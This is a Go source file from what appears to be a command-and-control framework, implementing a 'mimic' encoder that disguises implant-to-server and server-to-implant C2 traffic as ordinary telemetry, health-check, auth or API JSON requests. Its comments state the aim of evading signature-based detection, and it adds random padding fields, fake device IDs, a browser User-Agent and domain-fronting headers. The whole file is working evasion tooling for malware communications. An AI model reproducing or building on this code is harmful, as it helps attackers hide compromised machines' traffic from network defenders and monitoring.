package encoders

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"math/rand"
	"strings"
	"sync"
	"time"
)

// ---------------------------------------------------------------------------
// MimicConfig — configures the HTTP-traffic-mimicking encoder
// ---------------------------------------------------------------------------

// MimicConfig controls how the mimic encoder wraps C2 payloads in HTTP-like
// JSON envelopes to evade simple signature-based detection.
type MimicConfig struct {
	// UserAgent is the HTTP User-Agent header value.
	UserAgent string

	// Method used in the simulated HTTP request (GET, POST, etc.).
	Method string

	// Endpoint path (e.g., "/api/telemetry", "/v1/metrics").
	Endpoint string

	// Host header value.
	Host string

	// ContentType for the JSON payload.
	ContentType string

	// ExtraHeaders are additional HTTP headers to include.
	ExtraHeaders map[string]string

	// CookieJar holds session cookies (settable for stateful mimicry).
	CookieJar map[string]string

	// DomainFront is the front domain for domain-fronting (if non-empty, the
	// request is structured to route through this CDN/domain).
	DomainFront string

	// DomainFrontHeader is the header used for domain fronting (default "Host").
	DomainFrontHeader string

	// InnerEncoder is an optional sub-encoder applied before wrapping.
	// Typically this is an XOR encoder with the session key.
	InnerEncoder Encoding

	// ObfuscateJSON controls whether JSON field names are randomized.
	ObfuscateJSON bool

	// TelemetryMode selects the type of simulated traffic:
	//   "metrics"    — looks like system metrics upload
	//   "telemetry"  — looks like application telemetry
	//   "health"     — looks like a health check / heartbeat
	//   "auth"       — looks like an authentication request
	//   "api"        — looks like a generic API call
	TelemetryMode string

	// SignField is the JSON field name used to embed the encoded payload.
	// Defaults to "signature" if empty.
	SignField string

	// Padding adds extra random fields to the JSON envelope.
	Padding bool
}

// DefaultMimicConfig returns a sensible default configuration.
func DefaultMimicConfig() *MimicConfig {
	return &MimicConfig{
		UserAgent:         "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		Method:            "POST",
		Endpoint:          "/api/telemetry",
		Host:              "api.telemetry.example.com",
		ContentType:       "application/json",
		ExtraHeaders:      map[string]string{"Accept": "application/json"},
		CookieJar:         make(map[string]string),
		DomainFront:       "",
		DomainFrontHeader: "Host",
		InnerEncoder:      nil,
		ObfuscateJSON:     false,
		TelemetryMode:     "telemetry",
		SignField:         "signature",
		Padding:           true,
	}
}

// ---------------------------------------------------------------------------
// Templates for the JSON envelope bodies
// ---------------------------------------------------------------------------

type envelopeTemplate struct {
	Fields    []string          // field names in order
	StaticVal map[string]any   // static values keyed by field name
	DataField string            // nested data field name (for inner payload)
	SignField string            // field where the encoded payload goes
}

var telemetryTemplates = map[string]*envelopeTemplate{
	"metrics": {
		Fields: []string{"device_id", "timestamp", "session", "metrics", "signature"},
		StaticVal: map[string]any{
			"metrics": map[string]any{
				"cpu":    "${cpu}",
				"memory": "${mem}",
				"disk":   "${disk}",
			},
		},
		DataField: "metrics",
		SignField: "signature",
	},
	"telemetry": {
		Fields: []string{"device_id", "timestamp", "event", "data", "signature"},
		StaticVal: map[string]any{
			"event": "system_heartbeat",
		},
		DataField: "data",
		SignField: "signature",
	},
	"health": {
		Fields: []string{"device_id", "timestamp", "status", "checks", "signature"},
		StaticVal: map[string]any{
			"status": "ok",
			"checks": map[string]any{
				"connectivity": true,
				"dns":          true,
				"latency_ms":   "${latency}",
			},
		},
		DataField: "checks",
		SignField: "signature",
	},
	"auth": {
		Fields: []string{"device_id", "timestamp", "token", "refresh_token", "signature"},
		StaticVal: map[string]any{
			"token":         "${jwt_token}",
			"refresh_token": "${refresh}",
		},
		DataField: "token",
		SignField: "signature",
	},
	"api": {
		Fields: []string{"request_id", "timestamp", "method", "params", "signature"},
		StaticVal: map[string]any{
			"method": "${api_method}",
			"params": map[string]any{
				"version": "v2",
				"format":  "json",
			},
		},
		DataField: "params",
		SignField: "signature",
	},
}

// ---------------------------------------------------------------------------
// Response template (for server -> implant direction)
// ---------------------------------------------------------------------------

type responseEnvelope struct {
	Fields    []string
	StaticVal map[string]any
	DataField string
}

var responseTemplate = &envelopeTemplate{
	Fields: []string{"status", "timestamp", "server_id", "data", "signature"},
	StaticVal: map[string]any{
		"status":    "ok",
		"server_id": "${server_id}",
	},
	DataField: "data",
	SignField: "signature",
}

// ---------------------------------------------------------------------------
// MimicEncoding
// ---------------------------------------------------------------------------

// MimicEncoding wraps C2 payloads in HTTP-like JSON envelopes to evade
// signature-based detection.  It implements the Encoding interface.
type MimicEncoding struct {
	config *MimicConfig
	mu     sync.RWMutex

	// rng is a seeded local random generator for field generation.
	rng *rand.Rand

	// deviceID is generated once per instance to simulate a persistent device.
	deviceID string
}

// NewMimicEncoding creates a MimicEncoding with the given config.
func NewMimicEncoding(config *MimicConfig) (*MimicEncoding, error) {
	if config == nil {
		config = DefaultMimicConfig()
	}
	if config.SignField == "" {
		config.SignField = "signature"
	}
	// Ensure a cookie jar exists
	if config.CookieJar == nil {
		config.CookieJar = make(map[string]string)
	}
	// Ensure extra headers map exists
	if config.ExtraHeaders == nil {
		config.ExtraHeaders = make(map[string]string)
	}

	did, _ := UUID4()

	m := &MimicEncoding{
		config:   config,
		rng:      rand.New(rand.NewSource(time.Now().UnixNano())),
		deviceID: did,
	}
	return m, nil
}

// ---------------------------------------------------------------------------
// Encoding interface implementation
// ---------------------------------------------------------------------------

// Encode wraps raw C2 data into an HTTP-like JSON envelope (implant -> server).
// If an InnerEncoder is configured, the data is first transformed.
func (m *MimicEncoding) Encode(data []byte) ([]byte, error) {
	m.mu.Lock()
	defer m.mu.Unlock()

	payload := data

	// Apply inner encoder if present
	if m.config.InnerEncoder != nil {
		var err error
		payload, err = m.config.InnerEncoder.Encode(payload)
		if err != nil {
			return nil, fmt.Errorf("mimic encode inner: %w", err)
		}
	}

	// Base64-encode the payload so it is JSON-safe
	b64Payload := base64Encode(payload)

	// Build the envelope
	envelope := m.buildEnvelopeLocked(b64Payload, false)

	// Marshal to JSON
	body, err := json.Marshal(envelope)
	if err != nil {
		return nil, fmt.Errorf("mimic encode marshal: %w", err)
	}

	return body, nil
}

// Decode extracts the original C2 data from an HTTP-like JSON envelope
// (server -> implant direction).
func (m *MimicEncoding) Decode(data []byte) ([]byte, error) {
	m.mu.Lock()
	defer m.mu.Unlock()

	// Parse envelope
	var envelope map[string]json.RawMessage
	if err := json.Unmarshal(data, &envelope); err != nil {
		return nil, fmt.Errorf("%w: mimic decode unmarshal: %w", ErrDecodeFailed, err)
	}

	// Extract the signature field
	signRaw, ok := envelope[m.config.SignField]
	if !ok {
		return nil, fmt.Errorf("%w: mimic decode: missing field %q", ErrDecodeFailed, m.config.SignField)
	}

	var b64Payload string
	if err := json.Unmarshal(signRaw, &b64Payload); err != nil {
		return nil, fmt.Errorf("%w: mimic decode sign field: %w", ErrDecodeFailed, err)
	}

	// Base64 decode
	payload, err := base64Decode([]byte(b64Payload))
	if err != nil {
		return nil, fmt.Errorf("%w: mimic decode base64: %w", ErrDecodeFailed, err)
	}

	// Apply inner decoder if present
	if m.config.InnerEncoder != nil {
		payload, err = m.config.InnerEncoder.Decode(payload)
		if err != nil {
			return nil, fmt.Errorf("mimic decode inner: %w", err)
		}
	}

	return payload, nil
}

func (m *MimicEncoding) Type() Type { return TypeMimic }

func (m *MimicEncoding) Name() string { return "mimic" }

// ---------------------------------------------------------------------------
// Configuration helpers
// ---------------------------------------------------------------------------

// SetConfig atomically replaces the configuration.
func (m *MimicEncoding) SetConfig(cfg *MimicConfig) {
	m.mu.Lock()
	m.config = cfg
	m.mu.Unlock()
}

// Config returns a copy of the current configuration.
func (m *MimicEncoding) Config() *MimicConfig {
	m.mu.RLock()
	defer m.mu.RUnlock()
	cfg := *m.config
	cfg.ExtraHeaders = copyMap(m.config.ExtraHeaders)
	cfg.CookieJar = copyMap(m.config.CookieJar)
	return &cfg
}

// SetInnerEncoder configures the inner encoding layer (typically XOR with
// a session key).
func (m *MimicEncoding) SetInnerEncoder(enc Encoding) {
	m.mu.Lock()
	m.config.InnerEncoder = enc
	m.mu.Unlock()
}

// SetDomainFront configures domain fronting parameters.
func (m *MimicEncoding) SetDomainFront(frontDomain, header string) {
	m.mu.Lock()
	m.config.DomainFront = frontDomain
	if header != "" {
		m.config.DomainFrontHeader = header
	}
	m.mu.Unlock()
}

// ---------------------------------------------------------------------------
// Envelope generation
// ---------------------------------------------------------------------------

// buildEnvelopeLocked creates the JSON envelope map.
// Caller MUST hold m.mu write lock.
func (m *MimicEncoding) buildEnvelopeLocked(b64Payload string, isResponse bool) map[string]any {
	var tpl *envelopeTemplate
	fields := make([]string, 0)

	if isResponse {
		tpl = responseTemplate
		fields = tpl.Fields
	} else {
		mode := m.config.TelemetryMode
		var ok bool
		tpl, ok = telemetryTemplates[mode]
		if !ok {
			tpl = telemetryTemplates["telemetry"]
		}
		fields = tpl.Fields
	}

	envelope := make(map[string]any)

	for _, field := range fields {
		if field == tpl.SignField {
			envelope[field] = b64Payload
			continue
		}
		if val, ok := tpl.StaticVal[field]; ok {
			// Substitute dynamic placeholders
			envelope[field] = m.substitutePlaceholders(val)
		} else {
			// Generate a plausible value by field name
			envelope[field] = m.generateField(field)
		}
	}
	// Add padding fields if enabled
	if m.config.Padding {
		m.addPadding(envelope)
	}
	// Add domain-fronting header field if configured
	if m.config.DomainFront != "" {
		envelope["__front__"] = m.config.DomainFront
	}
	return envelope
}

// substitutePlaceholders recursively walks a value and replaces ${...} tokens.
func (m *MimicEncoding) substitutePlaceholders(val any) any {
	switch v := val.(type) {
	case string:
		return m.resolvePlaceholder(v)
	case map[string]any:
		out := make(map[string]any, len(v))
		for k, vv := range v {
			out[k] = m.substitutePlaceholders(vv)
		}
		return out
	case []any:
		out := make([]any, len(v))
		for i, vv := range v {
			out[i] = m.substitutePlaceholders(vv)
		}
		return out
	default:
		return v
	}
}

// resolvePlaceholder substitutes known ${...} tokens with generated values.
func (m *MimicEncoding) resolvePlaceholder(s string) string {
	if !strings.Contains(s, "${") {
		return s
	}
	result := s
	// Simple token replacements
	replacements := map[string]func() string{
		"${cpu}": func() string {
			return fmt.Sprintf("%.1f", 20.0+m.rng.Float64()*60.0)
		},
		"${mem}": func() string {
			return fmt.Sprintf("%.1f", 30.0+m.rng.Float64()*50.0)
		},
		"${disk}": func() string {
			return fmt.Sprintf("%.1f", 40.0+m.rng.Float64()*40.0)
		},
		"${latency}": func() string {
			return fmt.Sprintf("%d", 10+m.rng.Intn(200))
		},
		"${jwt_token}": func() string {
			tok, _ := RandHex(32)
			return tok
		},
		"${refresh}": func() string {
			tok, _ := RandHex(48)
			return tok
		},
		"${api_method}": func() string {
			methods := []string{"getStatus", "sendMetrics", "checkUpdate", "syncData"}
			return methods[m.rng.Intn(len(methods))]
		},
		"${server_id}": func() string {
			id, _ := RandHex(8)
			return id
		},
	}
	for token, gen := range replacements {
		if strings.Contains(result, token) {
			result = strings.ReplaceAll(result, token, gen())
		}
	}
	return result
}

// generateField creates a plausible value based on the field name.
func (m *MimicEncoding) generateField(field string) any {
	switch {
	case strings.Contains(field, "device") || strings.Contains(field, "id") || strings.Contains(field, "uuid"):
		if m.deviceID != "" {
			return m.deviceID
		}
		id, _ := UUID4()
		return id
	case strings.Contains(field, "timestamp") || strings.Contains(field, "time"):
		return NowTimestamp()
	case strings.Contains(field, "session"):
		sid, _ := UUID4()
		return sid
	case strings.Contains(field, "event"):
		events := []string{"heartbeat", "metrics_upload", "config_request", "status_report"}
		return events[m.rng.Intn(len(events))]
	case strings.Contains(field, "request") && strings.Contains(field, "id"):
		rid, _ := UUID4()
		return rid
	case strings.Contains(field, "status"):
		statuses := []string{"ok", "active", "online", "healthy"}
		return statuses[m.rng.Intn(len(statuses))]
	case strings.Contains(field, "version"):
		vers := []string{"1.0", "1.2.3", "2.0.1", "3.0.0-beta"}
		return vers[m.rng.Intn(len(vers))]
	default:
		id, _ := RandHex(8)
		return id
	}
}

// addPadding inserts extra random fields to make the envelope look more natural.
func (m *MimicEncoding) addPadding(envelope map[string]any) {
	paddingFields := []string{"env", "platform", "arch", "locale", "tz"}
	paddingValues := map[string][]string{
		"env":      {"production", "staging", "development"},
		"platform": {"linux", "windows", "darwin"},
		"arch":     {"amd64", "arm64", "386"},
		"locale":   {"en-US", "en-GB", "de-DE", "ja-JP"},
		"tz":       {"UTC", "America/New_York", "Europe/London", "Asia/Tokyo"},
	}
	for _, f := range paddingFields {
		if _, exists := envelope[f]; !exists {
			if vals, ok := paddingValues[f]; ok {
				envelope[f] = vals[m.rng.Intn(len(vals))]
			}
		}
	}
}

// GetHeaders returns the HTTP headers that should accompany the generated body.
func (m *MimicEncoding) GetHeaders() map[string]string {
	m.mu.RLock()
	defer m.mu.RUnlock()

	headers := make(map[string]string)
	headers["User-Agent"] = m.config.UserAgent
	headers["Content-Type"] = m.config.ContentType
	headers["Accept"] = "application/json"
	headers["X-Request-ID"], _ = UUID4()

	for k, v := range m.config.ExtraHeaders {
		headers[k] = v
	}

	// Domain fronting header override
	if m.config.DomainFront != "" {
		headers[m.config.DomainFrontHeader] = m.config.DomainFront
	}
	return headers
}

// GetCookies returns the session cookies.
func (m *MimicEncoding) GetCookies() map[string]string {
	m.mu.RLock()
	defer m.mu.RUnlock()
	return copyMap(m.config.CookieJar)
}

// SetCookie sets a cookie value.
func (m *MimicEncoding) SetCookie(name, value string) {
	m.mu.Lock()
	m.config.CookieJar[name] = value
	m.mu.Unlock()
}

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

func base64Encode(data []byte) string {
	return base64.StdEncoding.EncodeToString(data)
}

func base64Decode(data []byte) ([]byte, error) {
	return base64.StdEncoding.DecodeString(string(data))
}

func copyMap(src map[string]string) map[string]string {
	dst := make(map[string]string, len(src))
	for k, v := range src {
		dst[k] = v
	}
	return dst
}
